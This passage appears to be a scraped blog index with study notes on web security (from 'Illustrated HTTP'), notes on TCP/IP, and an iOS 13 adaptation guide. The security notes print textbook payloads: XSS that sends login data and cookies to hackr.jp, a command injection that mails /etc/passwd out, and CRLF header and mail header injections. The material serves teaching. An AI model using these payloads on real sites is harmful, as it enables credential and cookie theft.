应用的攻击，通过 URL 查询字段或表单、HTTP 首部、Cookie 等途径把攻击代码传入。针对 Web 应用的攻击模式：\n     * 主动攻击，是指攻击者通过直接访问 Web 应用， 把攻击代码传入的攻击模式。有代表性的攻击是 SQL 注入攻击和 OS 命令注 入攻击。\n     * 被动攻击，是指利用圈套策略执行攻击代码的攻击模式，步骤如下：\n       1. 攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的 HTTP 请求。\n       2. 当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。\n       3. 中招后的用户浏览器会把含有攻击代码的 HTTP 请求发送给作为攻击目标的 Web 应用，运行攻击代码。\n       4. 执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。\n\n   * 利用被动攻击，可发起对原本从互联网上无法直接访问的企业内网等网络的攻击。\n\n2. **因输出值转义不完全引发的安全漏洞**\n\n   * 实施 Web 应用的安全对策可大致分为以下两部分：\n     * 客户端的验证\n     * Web 应用端（服务器端）的验证\n       * 输入值验证\n       * 输出值转义\n\n     多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范 对策。\n\n     从数据库或文件系统、HTML、邮件等输出 Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。\n\n   * 跨站脚本攻击\n\n     跨站脚本攻击 (Cross-Site Scripting，XSS) 是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。跨站脚本攻击有可能造成以下影响：\n\n     * 利用虚假输入表单骗取用户个人信息。\n     * 利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下， 帮助攻击者发送恶意请求。\n     * 显示伪造的文章或图片。\n\n     示例1：（输入个人信息后发送到攻击者的网站）\n\n     ```html\n     http://example.jp/login?ID=\"><script>var+f=document.getElementById(\"login\");+f.action=\"http://hackr.jp/pwget\";+f.method=\"get\";</script><span+s=\"\n     ```\n\n     示例2：（获取该 Web 应用所处域名下的 Cookie 信息）\n\n     ```html\n     <script src=http://hackr.jp/xss.js></script>\n     ```\n\n     ```javascript\n     // xss.js\n     var content = escape(document.cookie); \n     document.write(\"<img src=http://hackr.jp/?\"); \n     document.write(content);\n     document.write(\">\");\n     ```\n\n   * SQL 注入攻击\n\n     * SQL 注入(SQL Injection)是指针对 Web 应用使用的数据库，通 过运行非法的 SQL 而产生的攻击。\n\n     * 示例：\n\n       地址栏的某参数会作为搜索功能的关键字，在该参数后加上`'--'`，会把后面的条件全视为注释。\n\n   * OS 命令注入攻击\n\n     * 通过 Web 应用，执行非法的操作系统命令达到攻击的目的。\n\n     * 示例：\n\n       ```js\n       // 表单中的核心代码，调用 sendmail 命令发送邮件，地址为 &adr\n       my $adr = $q->param('mailaddress'); \n       open(MAIL, \"| /usr/sbin/sendmail $adr\"); \n       print MAIL \"From: info@example.com\\n\";\n       ```\n\n       ```shell\n       # 攻击者将地址指定为以下值\n       ; cat /etc/passwd | mail hack@example.jp\n       ```\n\n   * HTTP 首部注入攻击\n\n     * 攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。\n\n     * 示例：\n\n       ```html\n       // 选择类别后，通过类别 ID 反映在响应内的 Location 首部字段内。类别后加上：\n       101%0D%0ASet-Cookie:+SID=123456789\n       ```\n\n       其中 %0D%0A 代表 HTTP 报文中的换行符，攻击者可以修改任意的 Cookie 信息。\n\n     * HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个 %0D%0A%0D%0A 并排插入字符串后发送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。\n\n   * 邮件首部注入攻击\n\n     * %0D%0A 在邮件报文中代表换行符。一旦咨询表单所在的 Web 应用接收了这个换行符，就可能实现对 BCC(Blind Carbon Copy) 邮件地址的追加发送：\n\n       ```\n       bob@hackr.jp%0D%0ABcc: user@example.com\n       ```\n\n     * 另外像下面一样，使用两个连续的换行符就有可能篡改邮件文本 内容并发送。\n\n       ```\n       bob@hackr.jp%0D%0A%0D%0ATest Message\n       ```\n\n   * 目录遍历攻击\n\n     * 是指对本无意公开的文件目录， 通过非法截断其目录路径后，达成访问目的的一种攻击。\n     * 可使用 .../ 等相对路径定位到 /etc/passed 等绝对路径上。\n\n   * 远程文件包含漏洞\n\n     * 当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的 URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。\n     * 主要是 PHP 存在的安全漏洞，对 PHP 的 include 或 require 来说， 这是一种可通过设定，指定外部服务器的 URL 作为文件名的功能。外部文件可以通过 system 函数执行 OS 命令。\n\n3. **因设置或设计上的缺陷引发的安全漏洞**\n\n   * 强制浏览安全漏洞，从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。\n   * 不正确的错误消息处理，是指Web 应用的错误信息内包含对攻击者有用的信息。\n   * 开放重定向，是一种对指定的任意 URL 作重定向跳转的功能。\n\n4. **因会话管理疏忽引发的安全漏洞**\n\n   * 会话劫持，是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。\n   * 会话固定攻击，强制用户使用攻击者指定的会话 ID。\n   * 跨站点请求伪造，是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。\n\n5. **其他安全漏洞**\n\n   * 密码破解攻击，即算出密码，突破认证。包括：\n\n     * 通过网络的密码试错：\n       * 穷举法。\n       * 字典攻击，事先收集好候选密码来尝试通过验证。\n     * 对已加密密码的破解：\n       * 通过穷举法**·**字典攻击进行类推\n       * 彩虹表，由明文密码及与之对应的散列值构成 的一张数据库表\n       * 拿到密钥，共享密钥加密方式\n       * 加密算法的漏洞\n\n   * 点击劫持，利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。\n\n   * DoS 攻击，是一种让运行中的服务呈停止状态的攻击，主要有以下两种：\n\n     * 集中利用访问请求造成资源过载\n     * 通过攻击安全漏洞使服务停止\n\n     多台计算机发起的 DoS 攻击称为 DDoS 攻击 (Distributed Denial of Service attack)。DDoS 攻击通常利用那些感染病毒的计算机作为攻 击者的攻击跳板。\n\n   * 后门程序，指开发设置的隐藏入口，可不按正常步骤使用受限功能。\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["Network"]},{"title":"《图解 TCP/IP》知识点整理","url":"/2019/11/14/图解 TCP:IP 知识点记录/","content":"\n### 网络基础知识\n\n1. 网络构成的要素：\n   * **网卡**：使计算机连网\n   * **中继器**：从物理层上延长网络\n   * **网桥（2层交换机）**：从数据链路层上延长网络\n   * **路由器（3层交换机）**：通过网络层转发分组数据\n   * **4～7层交换机**：处理传输层以上各层网络传输\n   * **网关**：转换协议\n2. OSI 各个分层的主要作用：\n   - **应用层**：为应用程序提供服务并规定应用程序中通信相关的细节。\n   - **表示层**：将设备固有的数据格式转换为网络标准传输格式。\n   - **会话层**：负责建立和断开通信连接，以及数据分割等传输相关的管理。\n   - **传输层**：在通信双方的节点上进行可靠传输。\n   - **网络层**：将数据传输到目标地址，主要负责寻址和路由选择。\n   - **数据链路层**：物理层面上互连的节点之间通信传输。\n   - **物理层**：负责比特流于电压高低、光的闪灭之间的转换。\n3. 传输方式的分类\n   - **面向有连接型**：ATM、帧中继、TCP\n   - **面向无连接型**：以太网、IP、UDP\n\n4. 地址\n\n   * 在同一通信网络中不允许有两个相同地址的通信主体存在\n\n   * MAC 地址和 IP 地址都具有唯一性，但是只有 IP 地址具有层次性。MAC 地址是真正负责最终通信的地址，但实际寻址中，IP 地址必不可少。\n\n### TCP/IP基础知识\n\n1. 传输中数据包，一部分由协议所要用到的首部，另一部分是上层传过来的数据，每个包首部包含两个信息：一个是发送端和接收端地址，另一个是上一层的协议类型。\n   - **TCP首部**：源端口号、目标端口号、序号、以及校验和\n   - **IP首部**：接收端 IP 地址以及发送端 IP 地址\n   - **以太网首部**：接收端 MAC 地址、发送端 MAC 地址以及标志以太网类型的以太网数据的协议\n\n### 数据链路层\n\n1. 以太网前端有一个前导码，表示一个以太网帧的开始，也是对端网卡能够确保与其同步的标志。前导码末尾有个SFD的域，它的值是“11”，前导码与 SFD 合起来占8个字节。\n2. 常见数据链路：以太网、802.11、蓝牙、PPP（Point-to-point Protocol）、ATM（Asynchronous Transfer Mode）、FDDI（Fiber Distributed Data Interface）、光线通道等。\n3. 不同数据链路的最大区别在于各自的最大传输单位（MTU）不同。\n\n### IP 协议\n\n1. IP 地址由 “网络标识“ 和 ”主机标识” 两部分组成。\n2. IP 地址的分类：\n   1. **A类地址**：首位为“0”，从第 1 位到第 8 位是它的网络标识，后 24 位为主机标识，十进制表示位：0.0.0.0~127.0.0.0。\n   2. **B类地址**：首位为“10”，从第 1 位到第 16 位是它的网络标识，后 16 位为主机标识，十进制表示位：128.0.0.0~191.255.0.0。\n   3. **C类地址**：首位为“110”，从第 1 位到第 24 位是它的网络标识，后 8 位为主机标识，十进制表示位：192.0.0.0~223.255.255.0。\n   4. **D类地址**：首位为“1110”，从第 1 位到第 32 位都是它的网络标识，没有主机标识，常用于多播，十进制表示位：224.0.0.0~239.255.255.255。\n3. 广播地址：主机部分全部设置为1。\n4. 子网：将原来的A类、B类、C类等分类中的主机地址部分用作子网地址，可以将原网络分为多个物理网络的一种机制。对应网络标识部分全为1，主机标识部分全为0。\n5. IPv6 地址的长度是原来的 4 倍，128 比特。\n\n### IP 协议相关技术\n\n1. DNS 查询流程：\n\n   1. 向 DNS 服务器查询 IP 地址；\n   2. DNS 服务器在自己的数据库查找，如果找不到就向上层根域名服务器请求查询，从根开始对域名树按照顺序进行遍历，知道找到制定的域名服务器；\n   3. 上层域名服务器返回域名的 IP 地址给客户端；\n\n2. ARP 工作机制：通过广播发送一个 ARP 请求包，包含目标主机的 IP 地址，由于广播的包可以被同一个链路所有主机和路由器进行解析，因此目标主机也会对此请求包进行解析，如果 ARP 请求包中的目标地址和自己的 IP 地址一致，那么这个节点就将自己的 MAC 地址塞入 ARP 响应包中返回。\n\n3. ICMP 主要功能包括，确认 IP 包是否成功送达目标地址，通知在发送过程中 IP 包被废弃的具体原因，改善网络设置等。\n\n4. 在网络层的首部后面继续追加网络层首部的通信方法叫做“IP 隧道”。\n\n5. Mobile IP 技术让主机在所连接的子网 IP 发生变化时，主机的 IP 地址仍保持不变，通信能够继续。\n\n6. DNS 解析过程：\n\n   1. 主机向本地域名服务器发起域名查询；\n   2. 本地域名服务器不知道本查询的域名的 IP 地址，于是向根域名服务器发出查询请求报文；\n   3. 根域名服务器返回顶级域名服务器的 IP 地址，本地域名服务器再向顶级域名服务器查询；\n   4. 顶级域名服务器返回查询的 IP 地址，或者告知下一步应当向哪一个权限域名服务器进行查询；\n   5. 本地域名服务器最终获得 IP 地址或者是出错的结果，返回给主机；\n\n7. ARP 工作流程：\n\n   主机 A 想要获取 主机 B 的 MAC 地址。\n\n   1. 主机 A 通过广播发送一个 ARP 请求包；\n   2. 请求包被同一链路上所有主机或路由解析；\n   3. 主机 B 解析请求包时发现目标 IP 地址与自己的 IP 一致，将自己的 MAC 地址塞入 ARP 响应包返回。\n\n8. NAT 的工作原理：\n\n   简单地说，NAT 就是在局域网内部网络中使用内部地址，而当内部节点要与外部网络进行通讯时，就在网关处，将内部地址替换成公用地址，从而在外部公网上正常使用。NAT 可被集成在路由器中，在其内部有一张自动生成的用来转换地址的表。\n\n### TCP 相关知识点\n\n1. TCP 通过序列号和确认应答（ACK）提高可靠性。\n\n   * 发送端将数据发出后会等待对端的确认应答，如果一定时间内没有等到确认应答，发送端就可以认为数据已经丢失，并进行重发。\n   * 未收到确认应答可能是数据对方已经收到，只是返回的确认应答在途中丢失。这种情况会进行重发，目标主机会收到重复的数据，因此通过序列号标记一段数据，接收端查询接收数据 TCP 首部的序列号和数据长度，将自己的下一步应该接受的序号作为确认应答返送回去，实现可靠传输。\n   * 重发超时的确定。TCP 每次发包时都会计算往返时间（RTT）及其波动的偏差，将往返时间和偏差相加，重发超时的时间就是比这个总和稍大一点的值。\n   * 重发到了一定次数，如果没有任何确认应答返回，就会判断为网络或对端主机发生异常，强制关闭连接。\n\n2. TCP 利用窗口控制提高速度\n\n   * 发送端主机在发送了一个段以后，不会一直等待确认应答，而是继续发送，从而缩短转发时间。\n   * 窗口大小指无需等待确认应答而可以继续发送数据的最大值。\n   * 如果窗口中部分数据出现丢包，发送端会设置缓存保留这些数据，直到收到他们的确认应答。\n   * **窗口控制**：窗口在一定程度较大时，即使有少部分的确认应答丢失也不会进行重发，可以通过下一个确认应答来确认。\n   * **高速重发控制**（**快重传**）：在窗口比较大，又出现报文段丢失的情况下，接收端没有收到自己期望序号的数据时，会对之前收到的数据进行确认应答，发送端主机如果连续 3 次收到同一个确认应答，就会将对应数据进行重发。其他数据发送数据放入队列，待重传结束后再正常传输。\n   * **流控制**：TCP 首部有个字段用来通知窗口大小，接收主机将自己可以接受的缓冲区大小放入字段中通知发送端。\n   * 接收端缓冲区快满了，会暂停接收数据，直到发出一个更新通知后通信才得以继续。\n   * 如果更新通知丢失了，过了重发超时的时间以后，发送端会时不时发送窗口探测的数据段，仅含一个字节以获取最新的窗口大小，从而保证通信能继续。\n\n3. 拥塞控制\n\n   * TCP 为了防止通信开始时就发送大量数据，使用了一种慢启动的算法，通过拥塞窗口（cwnd）调节数据发送量。\n   * **慢启动**时，将拥塞窗口大小设置为 1 MSS，之后每收到一次确认应答（ACK），拥塞窗口的值就加 1。\n   * 发送数据包时，将拥塞窗口的大小与接收端主机通知的窗口大小做比较，取较小值作为最大发送量。\n   * 为防止每次包的往后拥塞窗口以指数函数增长，引入慢启动阈值（ssthresh）。\n     1. **拥塞避免**：当窗口指数增大导致**超时重发**时，就会设置阈值为当前拥塞窗口的一半，窗口重新设置为 1。当窗口再次增大到超出这个阈值后，拥塞窗口按这个比例放大：1 个数据段的字节数 / 拥塞窗口（字节）* 1 个 数据段字节数，丈夫会逐渐呈直线上升趋势。\n     2. **快恢复**：而由重复确认应答进行**高速重发**控制时，慢启动阈值被设置为当前窗口大小的一半，窗口大小设置为慢启动阈值+3个数据段的大小，继续直线上升。\n\n4. 延迟确认应答是能够提高网络利用率从而降低计算机处理负荷的一种较优的处理机制。\n\n   * 在没有收到 2x最大段长度的数据为止不做确认应答。（有的操作系统是收到两个包就即可返回）\n   * 其他情况下，最大延迟 0.5 秒发送确认应答。（有的操作系统设置为 0.2 秒左右）\n\n5. 为什么建立握手三次连接，断开握手四次连接。\n\n   TCP 是一个双向的连接，服务端和客户端双方都有发送和接收数据的能力，因此双方都需要获得对方确认号，从而进入`ESTABLISHED`状态。\n\n   1. 进入`ESTABLISHED`状态首先需要向对方发起同步序列包（SYN），对方收到后返回一个确认包（ACK）。\n   2. 因此最简单的双方建立连接是经过四次的握手才建立的：1.客户端发送 `SYN`包；2. 服务端返回 `ACK` 包；3. 服务端发送 `SYN` 包；4. 客户端返回 `ACK`包。\n   3. 如果只有两次握手，也就是到第 2 步就建立连接，这样只有客户端确认服务端就绪，服务端则无法确定客户端就绪。假设 ACK 包丢失了，服务端在不知情的情况下开始发送数据，客户端只接收 ACK 包而忽略发来的数据，服务端没收到响应而一直发相同数据，从而会形成**死锁**。\n   4. 而 TCP 中，第 2、3 步是可以同时完成的，因此这两步的包合成一个 `SYN + ACK` 包，因此只需要三次握手即可完成建立连接。\n\n   同样，断开连接也是如此，双方需要关闭各自的通路。\n\n   1. 和建立连接类似，首先向对方发送 `FIN` 包，对方收到后返回 `ACK`包，这样就可以关闭自己的通路。整体的流程为：1.客户端发送 `FIN`包；2. 服务端返回 `ACK` 包；3. 服务端发送 `FIN` 包；4. 客户端返回 `ACK`包。\n   2. 和建立连接不同的是，在第 2 步服务端返回 `ACK` 包时，服务端可能还有数据没有发完，因此不能立即进行第 3 步发送，需要等数据发送完才能向客户端发 `FIN` 包断开连接。因此需要完整的四次挥手。\n\n6. 为什么第四次挥手时，客户端进入 `TIME_WAIT` 状态而不是直接关闭？\n\n   1. 假如第四次挥手时客户端直接进入`CLOSED`状态，然而发送的 `ACK`包丢失了，服务端在超时后会重发`FIN`包，这时因为客户端已经进入了`CLOSED`状态，返回的不是`ACK`包，而是`RST`包，服务端接收到 `RST`会认为连接错误，无法进入关闭状态，从而导致 TCP 协议不可靠。\n   2. 另一个原因是需要让旧数据包过期消失，假如客户端发送 `SYN`超时了，重发一次才成功建立连接，然后完成数据交互并断开了连接。这时假设第一次发送超时的请求终于到了，这个请求本应是无效的，服务端在不知情的情况下又再次建立连接。等待 2MSL 的目的就是让这种旧的数据包过期失效，因此如果在关闭连接后马上重连，就会出现端口不可用的情况。2 倍 MSL 时间是一个发送和一个回复所需要的最大时间。","tags":["Network"]},{"title":"iOS 13 适配要点总结","url":"/2019/08/09/iOS13适配要点总结/","content":"本文在 [掘金](https://juejin.im/user/5d8af836518825093a357646/posts) 也持续更新。\n## iOS 13 支持适配的机型\n* iPhone 11、iPhone 11 Pro、iPhone 11 Pro Max\n* iPhone X、iPhone XR、iPhone XS、iPhone XS Max\n* iPhone 8、iPhone 8 Plus\n* iPhone 7、iPhone 7 Plus\n* iPhone 6s、iPhone 6s Plus\n* iPhone SE\n* iPod touch (第七代)\n* 后续发布的新版本 iPhone\n\n## 适配时间节点要求\n> 2019 年 11 月 5 日\n\n苹果在当天正式弃用 `Xcode 11.2` 版本，需要更新至 `Xcode 11.2.1` 或之后的版本进行打包提审。\n> 2020 年 6 月 30 日\n\n*苹果在 2020.03.26 延迟了适配的时间节点，可见 [Deadline for App Updates has Been Extended\n](https://developer.apple.com/news/?id=03262020b)*\n1. 所有提交到 `AppStore` 的新应用和应用更新必须使用 `iOS 13` 的 SDK 进行**编译打包**。并支持所有对应所有设备的屏幕尺寸，详请可见 [Submit Your iPhone Apps to the App Store\n](https://developer.apple.com/news/?id=03042020b) 以及 [Submit Your iPad Apps to the App Store\n](https://developer.apple.com/news/?id=03042020c) ；\n2. 所有应用必须使用 `Xcode` `storyboard` 提供支持所有屏幕尺寸的**启动界面**，详请可见 [Building Adaptive User Interfaces for iPhone and iPad](https://developer.apple.com/news/?id=01132020b);\n3. **现有**的应用和应用中，更新符合苹果审核规则中关于接入 `Sign In With Apple` 功能要求的必须进行接入 ，具体要求可以见下文内容。\n4. 所有 AppWatch 应用必须使用 `watchOS 6` 或之后版本的 SDK 进行**编译打包**。\n5. Kids category 中的应用必须符合审核指南中的 guideline 1.3 、guideline 5.1.4。\n6. 使用 HTML 5 的应用必须符合审核指南的 guideline 4.7 sections 4, 5, and 6。\n\n> 2020 年 4 月\n\n**新应用**必须使用 `WKWebView` 代替 `UIWebView`，详请可见 [Updating Apps that Use Web Views](https://developer.apple.com/news/?id=12232019b)；\n> 2020 年 12 月\n\n**应用更新**必须使用 `WKWebView` 代替 `UIWebView`，详请可见 [Updating Apps that Use Web Views](https://developer.apple.com/news/?id=12232019b)；\n\n## 新特性适配\n### 1\\. Dark Mode\niOS 13 推出暗黑模式，`UIKit` 提供新的系统颜色和 api 来适配不同颜色模式，`xcassets` 对素材适配也做了调整，具体适配可见: [Implementing Dark Mode on iOS](https://developer.apple.com/videos/play/wwdc2019/214/)。\n\nDark Mode 不是必须适配，但前提是你需要确保应用在切换主题后不会影响到用户使用（比如说文字和背景颜色相同可能会影响使用）。如果不打算适配 Dark Mode，可以直接在 `Info.plist` 中添加一栏：`User Interface Style` : `Light`，即可在应用内禁用暗黑模式。\n\n另外，即使设置了颜色方案，申请权限的系统弹窗还是会依据系统的颜色进行显示，自己创建的 `UIAlertController` 就不会。\n\n### 2\\. Sign In with Apple \n在 iOS 13 中苹果推出一种在 App 和网站上快速、便捷登录的方式: [Sign In With Apple](https://developer.apple.com/videos/play/wwdc2019/706/)。这是 iOS 13 新增的功能，因此需要使用 Xcode 11 进行开发。关于应用是否要求接入此登录方式，苹果在 [App Store 应用审核指南](https://developer.apple.com/app-store/review/guidelines/#sign-in-with-apple) 中提到：\n> Apps that exclusively use a third-party or social login service (such as Facebook Login, Google Sign-In, Sign in with Twitter, Sign In with LinkedIn, Login with Amazon, or WeChat Login) to set up or authenticate the user’s primary account with the app must also offer Sign in with Apple as an equivalent option. \n\n如果你的应用使用了**第三方或社交账号登录服务**（如Facebook、Google、Twitter、LinkedIn、Amazon、微信等）来设置或验证用户的主账号，就必须把 `Sign In With Apple` 作为同等的选项添加到应用上。如果是下面这些类型的应用则**不需要**添加：\n* **仅仅**使用公司**内部账号**来注册和登录的应用；\n* 要求用户使用**现有的**教育或企业账号进行登录的教育、企业或商务类型的应用；\n* 使用**政府或业界支持**的公民身份识别系统或电子标识对用户进行身份验证的应用；\n* 特定第三方服务的应用，用户需要直接登录其邮箱、社交媒体或其他第三方帐户才能访问其内容。\n\n另外需要注意，关于何时要求接入 `Sign In With Apple`，苹果在 [News and Updates](https://developer.apple.com/news/) 中提到：\n> Starting today, new apps submitted to the App Store must follow these guidelines. Existing apps and app updates must follow them by April 2020. \n\n2019 年 9 月 12 日 起，提交到 App Store 的**新应用**必须按照应用审核指南中的标准进行接入；**现有**应用和应用更新必须也在 2020 年 4 月前完成接入。\n\n\n## API 适配\n### 1\\. <span id=\"api\">私有方法 KVC 可能导致崩溃</span>\n在 iOS 13 中**部分**方法属性不允许使用 `valueForKey`、`setValue:forKey:`  来获取或者设置私有属性，具体表现为在运行时会直接崩溃，并提示以下崩溃信息：\n```\n*** Terminating app due to uncaught exception 'NSGenericException', reason: 'Access to UISearchBar's _searchField ivar is prohibited. This is an application bug'\n```\n#### 解决方案\n目前整理的会导致崩溃的私有 api 和对应替代方案如下，感谢 [@君赏](https://juejin.im/user/57ad34026be3ff006b91c1f3) 的反馈，也欢迎各位大佬补充和指正 ：\n```\n// 崩溃 api\nUITextField *textField = [searchBar valueForKey:@\"_searchField\"];\n\n// 替代方案 1，使用 iOS 13 的新属性 searchTextField\nsearchBar.searchTextField.placeholder = @\"search\";\n\n// 替代方案 2，遍历获取指定类型的属性\n- (UIView *)findViewWithClassName:(NSString *)className inView:(UIView *)view{\n    Class specificView = NSClassFromString(className);\n    if ([view isKindOfClass:specificView]) {\n        return view;\n    }\n\n    if (view.subviews.count > 0) {\n        for (UIView *subView in view.subviews) {\n            UIView *targetView = [self findViewWithClassName:className inView:subView];\n            if (targetView != nil) {\n                return targetView;\n            }\n        }\n    }\n    \n    return nil;\n}\n\n// 调用方法\n UITextField *textField = [self findViewWithClassName:@\"UITextField\" inView:_searchBar];\n```\n---\n```\n// 崩溃 api\n[searchBar setValue:@\"取消\" forKey:@\"_cancelButtonText\"];\n\n// 替代方案，用同上的方法找到子类中 UIButton 类型的属性，然后设置其标题\nUIButton *cancelButton = [self findViewWithClassName:NSStringFromClass([UIButton class]) inView:searchBar];\n[cancelButton setTitle:@\"取消\" forState:UIControlStateNormal];\n```\n---\n```\n// 崩溃 api。获取 _placeholderLabel 不会崩溃，但是获取 _placeholderLabel 里的属性就会\n[textField setValue:[UIColor blueColor] forKeyPath:@\"_placeholderLabel.textColor\"];\n[textField setValue:[UIFont systemFontOfSize:20] forKeyPath:@\"_placeholderLabel.font\"];\n\n// 替代方案 1，去掉下划线，访问 placeholderLabel\n[textField setValue:[UIColor blueColor] forKeyPath:@\"placeholderLabel.textColor\"];\n[textField setValue:[UIFont systemFontOfSize:20] forKeyPath:@\"placeholderLabel.font\"];\n\n// 替代方案 2\ntextField.attributedPlaceholder = [[NSAttributedString alloc] initWithString:@\"输入\" attributes:@{\n    NSForegroundColorAttributeName: [UIColor blueColor],\n    NSFontAttributeName: [UIFont systemFontOfSize:20]\n}];\n```\n\n\n### 2\\. 推送的 deviceToken 获取到的格式发生变化\n原本可以直接将 `NSData` 类型的 `deviceToken` 转换成 `NSString` 字符串，然后替换掉多余的符号即可：\n```\n- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken {\n    NSString *token = [deviceToken description];\n    for (NSString *symbol in @[@\" \", @\"<\", @\">\", @\"-\"]) {\n        token = [token stringByReplacingOccurrencesOfString:symbol withString:@\"\"];\n    }\n    NSLog(@\"deviceToken:%@\", token);\n}\n```\n在 iOS 13 中，这种方法已经失效，`NSData`类型的 deviceToken 转换成的字符串变成了：\n```\n{length = 32, bytes = 0xd7f9fe34 69be14d1 fa51be22 329ac80d ... 5ad13017 b8ad0736 } \n```\n\n#### 解决方案\n需要进行一次数据格式处理，[友盟](https://developer.umeng.com/docs/66632/detail/126489)提供了一种做法，可以适配新旧系统：\n```\n#include <arpa/inet.h>\n- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken {\n    if (![deviceToken isKindOfClass:[NSData class]]) return;\n    const unsigned *tokenBytes = [deviceToken bytes];\n    // 数据格式处理\n    NSString *hexToken = [NSString stringWithFormat:@\"%08x%08x%08x%08x%08x%08x%08x%08x\",\n                          ntohl(tokenBytes[0]), ntohl(tokenBytes[1]), ntohl(tokenBytes[2]),\n                          ntohl(tokenBytes[3]), ntohl(tokenBytes[4]), ntohl(tokenBytes[5]),\n                          ntohl(tokenBytes[6]), ntohl(tokenBytes[7])];\n    NSLog(@\"deviceToken:%@\", hexToken);\n}\n```\n但是注意到这种方法限定了长度，而[官网文档](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1622958-application?language=objc)对此方法的说明中提到，*APNs device tokens are of variable length. Do not hard-code their size.* ，因此可以对数据格式处理部分进行优化：\n```\n- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken {\n    if (![deviceToken isKindOfClass:[NSData class]]) {\n        return;\n    }\n    const unsigned char *tokenBytes = deviceToken.bytes; \n    NSInteger count = deviceToken.length;\n    \n    // 数据格式处理\n    NSMutableString *hexToken = [NSMutableString string];\n    for (int i = 0; i < count; ++i) {\n        [hexToken appendFormat:@\"%02x\", tokenBytes[i]];\n    }\n    NSLog(@\"deviceToken:%@\", hexToken);\n}\n```\n\n### 3\\. <span id=\"present\">模态视图的默认样式发生改变</span>\n在 iOS 13，使用 `presentViewController` 方式打开模态视图，默认的如下图所示的视差效果，通过下滑返回。\n\n![UIModalPresentationAutomatic](img/UIModalPresentationAutomatic.gif)\n\n\n这是因为苹果将 `UIViewController` 的 `modalPresentationStyle` 属性的默认值改成了新加的一个枚举值  [UIModalPresentationAutomatic](https://developer.apple.com/documentation/uikit/uimodalpresentationstyle/uimodalpresentationautomatic?language=objc)，对于多数 `UIViewController`，此值会映射成 `UIModalPresentationPageSheet`。\n\n需要注意，这种效果弹出来的页面导航栏部分是会被砍掉的，在 storyboard 中也可以看到，页面布局时需要注意导航栏的内容不要被遮挡。\n\n![Storyboard](https://user-gold-cdn.xitu.io/2019/9/25/16d66db08020a579?w=300&h=221&f=png&s=49603)\n\n还有一点注意的是，我们原来以全屏的样式弹出一个页面，那么将这个页面弹出的那个 ViewController 会依次调用 `viewWillDisappear` 和 `viewDidDisappear`。然后在这个页面被 dismiss 的时候，将他弹出的那个 ViewController 的 `viewWillAppear` 和 `viewDidAppear` 会被依次调用。然而使用默认的视差效果弹出页面，将他弹出的那个 ViewController 并不会调用这些方法，原先写在这四个函数中的代码以后都有可能会存在问题。\n\n#### 解决方案\n如果视差效果的样式可以接受的话，就不需要修改；如果需要改回全屏显示的界面，需要手动设置弹出样式：\n```\n- (UIModalPresentationStyle)modalPresentationStyle {\n    return UIModalPresentationFullScreen;\n} \n```\n### 4\\. UISearchBar 黑线处理导致崩溃\n之前为了处理搜索框的黑线问题，通常会遍历 searchBar 的 subViews，找到并删除 `UISearchBarBackground`。\n```\nfor (UIView *view in _searchBar.subviews.lastObject.subviews) {\n    if ([view isKindOfClass:NSClassFromString(@\"UISearchBarBackground\")]) {\n        [view removeFromSuperview];\n        break;\n    }\n} \n```\n在 iOS13 中这么做会导致 UI 渲染失败，然后直接崩溃，崩溃信息如下：\n```\n*** Terminating app due to uncaught exception 'NSInternalInconsistencyException', reason: 'Missing or detached view for search bar layout'\n```\n#### 解决方案\n设置 `UISearchBar` 的背景图片为空:\n```\n[_searchBar setBackgroundImage:[UIImage new]];\n```\n### 5\\. UITabBarButton 不同状态下结构不同\n在 iOS 13 中，`UITabBarButton` 的控件结构会随着其选中状态的变化而变化，主要体现为 `UITabBarSwappableImageView` 和 `UITabBarButtonLabel` 的位置变化。在选中时和以前一样，是 `UITabBarButton` 的子控件。而在未选中状态下放到了 `UIVisualEffectView` 的 `_UIVisualEffectContentView` 里面。感谢[@关灯侠](https://juejin.im/user/5b8732a251882542ec199ec8)的提醒，具体可以看下图的对比：\n\n![UITabBarButton](https://user-gold-cdn.xitu.io/2019/10/9/16daf5e8a8c46820?w=300&h=203&f=png&s=95716)\n\n我们在自定义 `UITabBar` 时，通常会遍历 `UITabBarButton` 的子控件获取 `UITabBarSwappableImageView`，比如自定义红点时添加到这个 ImageView 的右上角，这在 iOS 13 中可能就会导致异常。\n\n#### 解决方案\n可以使用递归遍历 `UITabBarButton` 的所有 subviews 获取 `UITabBarSwappableImageView`，具体可以参照上面 [私有方法 KVC 可能导致崩溃](#api) 章节中给出的递归遍历方法。\n\n另外需要注意，未选中状态下，添加的红点会和 tabBar 的图片一样变成灰色，这一点应该也是因为其结构变化造成的。具体可以见下图：\n\n![UITabBar 